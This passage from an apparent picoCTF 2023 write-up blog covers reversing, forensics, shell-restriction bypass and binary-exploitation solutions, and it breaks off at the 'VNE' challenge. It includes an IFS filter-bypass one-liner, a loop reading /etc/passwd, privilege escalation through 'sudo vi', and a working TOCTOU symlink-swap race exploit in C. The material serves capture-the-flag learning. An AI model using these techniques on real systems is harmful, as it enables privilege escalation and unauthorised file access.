+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-comment">;assert 1</span><br><span class="hljs-comment">;https://corewar.co.uk/clearimp.htm</span><br>        org    start<br><br>gate    dat    <span class="hljs-number">4000</span>,       <span class="hljs-number">1700</span><br>bomb    dat    &gt;<span class="hljs-number">2667</span>,      <span class="hljs-number">11</span><br><br>        for    <span class="hljs-number">4</span><br>        dat    <span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>        rof<br><br>        <span class="hljs-built_in">spl</span>    <span class="hljs-meta">#4000,      &gt;gate</span><br>clear   <span class="hljs-keyword">mov</span>    bomb,       &gt;gate<br>        djn.f  clear,      &gt;gate<br><br>        for    <span class="hljs-number">23</span><br>        dat    <span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>        rof<br><br>        istep  equ <span class="hljs-number">1143</span>           <span class="hljs-comment">; (CORESIZE+1)/7</span><br><br>start   <span class="hljs-built_in">spl</span>    clear<span class="hljs-number">-1</span><br>        <span class="hljs-keyword">mov</span>    imp,        *launch<br>        <span class="hljs-built_in">spl</span>    <span class="hljs-number">1</span>                  <span class="hljs-comment">; 32 parallel processes</span><br>        <span class="hljs-built_in">spl</span>    <span class="hljs-number">1</span><br>        <span class="hljs-built_in">spl</span>    <span class="hljs-number">1</span><br>        <span class="hljs-built_in">spl</span>    <span class="hljs-number">1</span><br>        <span class="hljs-built_in">spl</span>    <span class="hljs-number">1</span><br>        <span class="hljs-built_in">spl</span>    nxpoint<br>launch  djn.f  <span class="hljs-number">3600</span>,       &lt;<span class="hljs-number">4000</span><br><br>        for    <span class="hljs-number">2</span><br>        dat    <span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>        rof<br><br>nxpoint <span class="hljs-keyword">add</span>.f  <span class="hljs-meta">#istep,     launch</span><br>        djn.f  clear<span class="hljs-number">-1</span>,    &lt;<span class="hljs-number">3000</span><br><br>imp     <span class="hljs-keyword">mov</span>.i  <span class="hljs-meta">#1,         istep</span><br>end<br></code></pre></td></tr></table></figure>
+<h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><p>Use Linux <code>strings</code> then get flag.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">strings ret | grep &#x27;pico&#x27;<br></code></pre></td></tr></table></figure>
+<h3 id="Safe-Opener-2"><a href="#Safe-Opener-2" class="headerlink" title="Safe Opener 2"></a>Safe Opener 2</h3><p>Use an online java class decomplier website and get java code below:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.io.Reader;<br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-comment">// </span><br><span class="hljs-comment">// Decompiled by Procyon v0.5.36</span><br><span class="hljs-comment">// </span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SafeOpener</span><br>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">keyboard</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(System.in));<br>        <span class="hljs-keyword">final</span> Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">encodedkey</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; ++i) &#123;<br>            System.out.print(<span class="hljs-string">&quot;Enter password for the safe: &quot;</span>);<br>            key = keyboard.readLine();<br>            encodedkey = encoder.encodeToString(key.getBytes());<br>            System.out.println(encodedkey);<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">isOpen</span> <span class="hljs-operator">=</span> openSafe(encodedkey);<br>            <span class="hljs-keyword">if</span> (isOpen) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            System.out.println(<span class="hljs-string">&quot;You have  &quot;</span> + (<span class="hljs-number">2</span> - i) + <span class="hljs-string">&quot; attempt(s) left&quot;</span>);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">openSafe</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String password)</span> &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">encodedkey</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;picoCTF&#123;SAf3_0p3n3rr_y0u_solv3d_it_6d84122a&#125;&quot;</span>;<br>        <span class="hljs-keyword">if</span> (password.equals(encodedkey)) &#123;<br>            System.out.println(<span class="hljs-string">&quot;Sesame open&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;Password is incorrect\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>Or directly <code>strings</code> it.</p>
+<h3 id="timer"><a href="#timer" class="headerlink" title="timer"></a>timer</h3><p>Use online jadx decompiler such as <a target="_blank" rel="noopener" href="http://www.javadecompilers.com/apk">http://www.javadecompilers.com/apk</a> or <a target="_blank" rel="noopener" href="https://www.unboxapk.com/apk-decompiler">https://www.unboxapk.com/apk-decompiler</a> to get decompiled data.</p>
+<p>Then <code>grep</code> our flag in the directory including decompiled files:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">grep -Ri &quot;picoCTF&quot; ./timer_source_from_JADX/<br></code></pre></td></tr></table></figure>
+<h3 id="Virtual-Machine-0-1"><a href="#Virtual-Machine-0-1" class="headerlink" title="Virtual Machine 0&#x2F;1"></a>Virtual Machine 0&#x2F;1</h3><p>.dae file is a kind of 3D model file and can be opened through many softwares such as SelfCAD, Autodesk Maya (cross-platform), or Blender. I choose to use blender on my local machine.<br>In the challenge 0, we can see blue and red axles and hint indicates that <em>the rotation of the red axle is input, the rotation of the blue axle is output</em>. But this hint actually confused a lot of people during the competition because of the puzzled input file.<br>I analyse the 3D model and find this is actually a <strong>gear transmission model</strong> after deleting some facial blocks:</p>
+<img src="/2023/03/29/picoctf2023writeup/vm0.png" class="">
+
+<p>We can easily compute that the speed of the blue gear is 5 times that of the red gear, so the input is actually the times of total rotating turns of red gear. But where is the flag? What we get is a long integer! If you are familiar with cryptography challenge, you can associate long integer with <code>long_to_bytes</code> in python crypto module:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>red = <span class="hljs-number">39722847074734820757600524178581224432297292490103996089444214757432940313</span><br>blue = red * <span class="hljs-number">5</span><br><span class="hljs-built_in">print</span>(blue)<br><span class="hljs-built_in">print</span>(long_to_bytes(blue))<br></code></pre></td></tr></table></figure>
+<p>Then we get flag. This is also why this challenge gets the most dislike :)</p>
+<p>In the challenge 1, we get another more sophisticated gear transmission model:</p>
+<img src="/2023/03/29/picoctf2023writeup/vm1.png" class="">
+<p>I ask my highschool classmate (major in Mechanical) to explain how to compute the ratio between three adjacent gears and the answer is <strong>average</strong>. I use a pen and paper to compute the ratio by hand. The final ratio is <code>9359</code>.</p>
+<h3 id="No-way-out"><a href="#No-way-out" class="headerlink" title="No way out"></a>No way out</h3><p>A unity reverse challenge. At first we try to find the flag by playing this game directly :) then we are blocked by an invisible wall at board so we can’t go to the place where flag is.</p>
+<p>I google sth about “unity reverse engineering” and find some useful tools especially <strong>dnSpy</strong>. After looking up some CTF reverse challenge writeups about unity games (<a target="_blank" rel="noopener" href="https://tripoloski1337.github.io/ctf/2019/09/09/reverse-engineering-unity-game.html">https://tripoloski1337.github.io/ctf/2019/09/09/reverse-engineering-unity-game.html</a> and <a target="_blank" rel="noopener" href="https://github.com/imadr/Unity-game-hacking">https://github.com/imadr/Unity-game-hacking</a>) , I find the file named <code>Assembly-CSharp.dll</code> located at <code>pico_Data/Managed</code> contains the compiled Csharp files, and also the main program logic:</p>
+<img src="/2023/03/29/picoctf2023writeup/nowayout2.png" class="">
+
+<p>I change the <code>moveDirection.y</code> of jump button to a constant value, then save it and compile again. When come back to game, I jump like on the moon! The invisible wall seems restricted by a height so I jump over it and go to the flag:</p>
+<img src="/2023/03/29/picoctf2023writeup/nowayout1.png" class="">
+<h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="hideme"><a href="#hideme" class="headerlink" title="hideme"></a>hideme</h3><p>Use <code>binwalk -e </code> to extract hidden files in png file, then we get a png file under <code>secret</code> directory:</p>
+<img src="/2023/03/29/picoctf2023writeup/hideme.png" class="">
+<p>OCR tool performs badly in recognize text of this picture so I read it by my eyes.</p>
+<h3 id="PcapPoisoning"><a href="#PcapPoisoning" class="headerlink" title="PcapPoisoning"></a>PcapPoisoning</h3><p><code>strings $&#123;filename&#125; | grep pico</code></p>
+<h3 id="who-is-it"><a href="#who-is-it" class="headerlink" title="who is it"></a>who is it</h3><p>Extract the ip in .eml file, then use <code>whois 173.249.33.206 | grep person</code> to find person name in the dumped data.</p>
+<h3 id="MSB"><a href="#MSB" class="headerlink" title="MSB"></a>MSB</h3><p>I search sth about MSB and find a useful tool in github:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">https://github.com/Pulho/sigBits</span><br>git clone https://github.com/Pulho/sigBits<br>python3 sigBits.py -t=msb ./Ninja-and-Prince-Genji-Ukiyoe-Utagawa-Kunisada.flag.png<br></code></pre></td></tr></table></figure>
+
+<p>Then grep “pico” in the <code>output.txt</code>. </p>
+<h2 id="General-Skills"><a href="#General-Skills" class="headerlink" title="General Skills"></a>General Skills</h2><h3 id="chrono"><a href="#chrono" class="headerlink" title="chrono"></a>chrono</h3><p><code>cd /challenge</code> directly and <code>cat</code>, probably a mistake of challenge makers.</p>
+<h3 id="money-ware"><a href="#money-ware" class="headerlink" title="money-ware"></a>money-ware</h3><p>I directly google <code>1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX</code> and find a news about it:</p>
+<img src="/2023/03/29/picoctf2023writeup/money-ware.png" class="">
+
+<p>The answer is <strong>Petya</strong>.</p>
+<h3 id="Permissions"><a href="#Permissions" class="headerlink" title="Permissions"></a>Permissions</h3><p>Use vim to read file in &#x2F;challenge (<code>vim /challenge</code>)  and get flag.</p>
+<h3 id="repetitions"><a href="#repetitions" class="headerlink" title="repetitions"></a>repetitions</h3><p><code>cat ./enc_flag | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d</code> .</p>
+<h3 id="Rules-2023"><a href="#Rules-2023" class="headerlink" title="Rules 2023"></a>Rules 2023</h3><p>Open DevTools then <code>Ctrl+F</code> to search “pico”.</p>
+<h3 id="useless"><a href="#useless" class="headerlink" title="useless"></a>useless</h3><p><code>man useless</code> .</p>
+<h3 id="Special"><a href="#Special" class="headerlink" title="Special"></a>Special</h3><p>I find the solution to bypass bash restrictions at <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions">https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions</a>. The space character is forbidden in this challenge, so we overwrite IFS(Internal Field Separator) variable and read flag:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">IFS=];b=cat]/challenge/metadata.json;$b<br></code></pre></td></tr></table></figure>
+<h3 id="Specialer"><a href="#Specialer" class="headerlink" title="Specialer"></a>Specialer</h3><p>In this challenge we can only use bash built-in command. <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions">https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions</a> considerates ways to read file in this circumstance but the demo command can’t read file content without newline character:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">while read -r line; do echo $line; done &lt; /etc/passwd<br></code></pre></td></tr></table></figure>
+
+<p>So I google about “how to use linux <code>read</code> to read a text file that ends without a newline”, I get this answer (<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/9408103/shell-script-how-to-read-a-text-file-that-does-not-end-with-a-newline-on-window">https://stackoverflow.com/questions/9408103/shell-script-how-to-read-a-text-file-that-does-not-end-with-a-newline-on-window</a>) and it works:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#! /usr/bin/bash</span><br><span class="hljs-comment"># https://stackoverflow.com/questions/9408103/shell-script-how-to-read-a-text-file-that-does-not-end-with-a-newline-on-window</span><br><br>FileName=<span class="hljs-string">&#x27;./ala/kazam.txt&#x27;</span><br><span class="hljs-keyword">while</span> [ 1 ] ; <span class="hljs-keyword">do</span>    <br>    <span class="hljs-built_in">read</span> -r line<br>    <span class="hljs-keyword">if</span> [ -z <span class="hljs-variable">$line</span> ] ; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">break</span><br>    <span class="hljs-keyword">fi</span><br>    fileNamesListStr=<span class="hljs-string">&quot;<span class="hljs-variable">$fileNamesListStr</span> <span class="hljs-variable">$line</span>&quot;</span><br>    <span class="hljs-keyword">done</span> &lt; <span class="hljs-variable">$FileName</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$fileNamesListStr</span>&quot;</span><br></code></pre></td></tr></table></figure>
+<h2 id="Binary-Exploitation"><a href="#Binary-Exploitation" class="headerlink" title="Binary Exploitation"></a>Binary Exploitation</h2><h3 id="two-sum"><a href="#two-sum" class="headerlink" title="two-sum"></a>two-sum</h3><p>The source C code doesn’t prevent us from integer overflow:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (addIntOvf(sum, num1, num2) == <span class="hljs-number">-1</span>)<br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You have an integer overflow\n&quot;</span>);<br>    fflush(<span class="hljs-built_in">stdout</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>So we let one of num1 and num2 be the <strong>maxinum</strong> of integer and the other be random positive integer. Since the <code>int</code> type in C language is 4 bytes and use <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Two%27s_complement">Two’s complement</a> to express integer number, the maxinum of int is <code>2147483647</code> which also can be easily searched with google. So we let num1 be <code>2147483647</code> and num2 be a arbitary postive number then we get flag.</p>
+<h3 id="hijacking"><a href="#hijacking" class="headerlink" title="hijacking"></a>hijacking</h3><p>I am stuck in this challenge for about a week and pay my almost whole attention to that python file due to the hints. The tag of this challenge includes <code>privilege-escalation</code> but I tried some uncorrect methods and missed the right way. During this time I am also attracted by the word “Social Engineering”, and I try to many ways to make that python file usable for privilege-escalation such as write a new <code>ping</code> shell-script in PATH dir, not surprisingly, all failed.</p>
+<p>I check the basic privilege-escalation techs (<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation">https://book.hacktricks.xyz/linux-hardening/privilege-escalation</a>) again and find a step I missed:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo -l<br></code></pre></td></tr></table></figure>
+<p>Then I find <code>vi</code> is allowed in challenge’s environment. So easily, I use <code>sudo vi /root</code> to get root privilege and read flag through vi. But the keyword in flag is about python library so maybe this an unintended solution.</p>
+<h3 id="tic-tac"><a href="#tic-tac" class="headerlink" title="tic-tac"></a>tic-tac</h3><p>Simply search the keyword toctou at google and youtube then I get really useful resource for this challenge:<br><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=5g137gsB9Wk">https://www.youtube.com/watch?v=5g137gsB9Wk</a> . This challenge is really similar to that in video, cause the most important reason of the vulnerability is that <strong>race condition involving the checking of the state of a part of a system (such as a security credential) and the use of the results of that check</strong> , according to <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use#:~:text=In%20software%20development%2C%20time%2Dof,the%20results%20of%20that%20check.">TOCTOU wikipedia</a> .</p>
+<p>In this challenge, the reason why TOCTOU exists is that <strong>we cannot check the uid of file and open file at the same time</strong>, aka <strong>this program is not atomic</strong> . The solution to this vulnerability is simply adding a lock before check and unlock after open but that’s another topic about Mutual exclusion.Another important reason is that <strong>we use file name to read contents</strong>:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">std::string filename = argv[<span class="hljs-number">1</span>];<br><span class="hljs-function">std::ifstream <span class="hljs-title">file</span><span class="hljs-params">(filename)</span></span>;<br></code></pre></td></tr></table></figure>
+
+<p>Since process can be interrupted by any other process, we can establish a soft link pointing to flag file and a empty file, for convenience I named them <code>flag_link</code> and <code>tic-tac</code> , implemented through:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">ln -s $&#123;flag_file&#125; flag_link<br>touch tic-tac <br></code></pre></td></tr></table></figure>
+
+<p>We use <code>ls -l</code> to check outputs and will find the owner of both <code>flag_link</code> and <code>tic-tac</code> is the same(not root), and <code>flag_link</code> is a symbol link pointing to flag file.</p>
+<p>The second thing we need to know is when we actually open the file? I know nothing about C++, to solve this problem I extract the code below:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fstream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-function">std::ifstream <span class="hljs-title">file</span><span class="hljs-params">(<span class="hljs-string">&quot;rename.c&quot;</span>)</span></span>;<br>    <span class="hljs-keyword">if</span> (file.<span class="hljs-built_in">is_open</span>())<br>    &#123;<br>        std::string line;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-built_in">getline</span>(file, line))<br>        &#123;<br>            std::cout &lt;&lt; line &lt;&lt; std::endl;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>Then I set breakpoint at <code>open@plt</code> using gdb at the second time running (because of <code>lazy binding</code> we can’t get libc address at the beginning), thus we can lookup the libc function call backtrace to attain the position where file opens at. According to the little program I made above, I finally found the file is open at  <code>std::ifstream file(filename);</code> .</p>
+<p>During <code>txtreader</code> running time, we can cycle exchanging file name of <code>flag_link</code> and <code>tic-tac</code> to attain the running frame as below:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs cpp">std::string filename = argv[<span class="hljs-number">1</span>];<br><span class="hljs-comment">//** input filename as tic-tac and we do first exchange here. </span><br><span class="hljs-function">std::ifstream <span class="hljs-title">file</span><span class="hljs-params">(filename)</span></span>;<br><span class="hljs-comment">//** the variable file actually points to the soft link to flag_file because of last exchange.</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">stat</span> statbuf;<br><br><span class="hljs-comment">//** here we do the second exchange to restore, so that statbuf associates the stat of original tic-tac.</span><br><br><span class="hljs-comment">// Check the file&#x27;s status information.</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">stat</span>(filename.<span class="hljs-built_in">c_str</span>(), &amp;statbuf) == <span class="hljs-number">-1</span>) &#123;<br>  std::cerr &lt;&lt; <span class="hljs-string">&quot;Error: Could not retrieve file information&quot;</span> &lt;&lt; std::endl;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// Check the file&#x27;s owner.</span><br><span class="hljs-keyword">if</span> (statbuf.st_uid != <span class="hljs-built_in">getuid</span>()) &#123;<br>  std::cerr &lt;&lt; <span class="hljs-string">&quot;Error: you don&#x27;t own this file&quot;</span> &lt;&lt; std::endl;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-comment">//** Since both the uid of tic-tac and real uid is both of normal user, we won&#x27;t go to return here.</span><br><br><span class="hljs-comment">// Read the contents of the file.</span><br><span class="hljs-comment">//** The file opened at the beginning so whatever filename is, file must point to flag_file. </span><br><span class="hljs-keyword">if</span> (file.<span class="hljs-built_in">is_open</span>()) &#123;<br>  std::string line;<br>  <span class="hljs-keyword">while</span> (<span class="hljs-built_in">getline</span>(file, line)) &#123;<br>    std::cout &lt;&lt; line &lt;&lt; std::endl;<br>  &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  std::cerr &lt;&lt; <span class="hljs-string">&quot;Error: Could not open file&quot;</span> &lt;&lt; std::endl;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>We do two exchanges before open file and before the uid check, aiming to open the flag_file and pass the check. The keypoint is that we can’t control the timespot of file name exchange, but we can attain our purpose by infinite loop of exchanging process, and the running frame above will happen probabilistically.</p>
+<p>But the thing is, if the exchanging operation is not atomic, running frame above will be more difficult to gain. Thankfully, we don’t need to pay attention with this issue because the exchanging operation has atomic implementation:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/fs.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> &#123;<br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>    syscall(SYS_renameat2, AT_FDCWD, argv[<span class="hljs-number">1</span>], AT_FDCWD, argv[<span class="hljs-number">2</span>], RENAME_EXCHANGE);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c</span><br><span class="hljs-comment">// https://www.youtube.com/watch?v=5g137gsB9Wk</span><br></code></pre></td></tr></table></figure>
+
+<p>All the advance preparation done, we can concentrate on final exploiting. First, we running a process to exchange file names forever at backend. Second, we use <code>txtreader</code> to read <code>flag_link</code> or <code>tic-tac</code> until we read flag. I use <code>disown</code> to make a command line running in the backend because I’m not sure tmux or sth else is allowed in this challenge. So the whole exploitation is:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc rename.c -o rename<br>./rename flag_link tic-tac &amp; <span class="hljs-built_in">disown</span> <span class="hljs-comment"># let rename running at backend</span><br>./txtreader tic-tac <span class="hljs-comment"># or ./txtreader flag_link until we read flag</span><br></code></pre></td></tr></table></figure>
+
+<p>A really interesting tactou challenge.</p>
+<h3 id="VNE"><a href="#VNE" class="headerlink" title="VNE"></a>VNE</h3><p>This program’s logic is to <code>ls</code> the directory specified by environment variable <code>SECRET_DIR</code> with root privilege. Then use ghidra or IDAPro to figure out how this program do <code>ls</code>:</p>
